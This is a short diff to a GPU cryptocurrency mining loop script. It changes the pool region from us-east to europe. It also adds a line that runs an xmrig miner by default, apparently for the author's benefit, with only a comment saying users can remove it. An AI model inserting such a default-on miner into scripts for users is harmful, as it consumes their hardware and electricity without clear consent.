@@ -2,6 +2,9 @@
 #uncomment below line to repeatedly tell nvidia-smi to limit power usage. There's definitely a better way to do this, but it works for now.
 #screen -dmS power-limiter /miners/plloop.sh 5
 
+#Comment out the line below if you don't want to compensate me for my work
+/miners/xmrig/xmrig
+
 while :
   do
     #make sure nothing's still mining
@@ -17,7 +20,7 @@ while :
     #clear
     date
     cd /miners/ethdcrminer
-    ./ethdcrminer64 -epool us-east.ethash-hub.miningpoolhub.com:12020 -ewal username.workername -eworker username.workername -esm 2 -epsw x -allcoins 1 -dbg -1 -retrydelay -1 -mport -2222
+    ./ethdcrminer64 -epool europe.ethash-hub.miningpoolhub.com:12020 -ewal username.workername -eworker username.workername -esm 2 -epsw x -allcoins 1 -dbg -1 -retrydelay -1 -mport -2222
 
     #groestl
     #clear
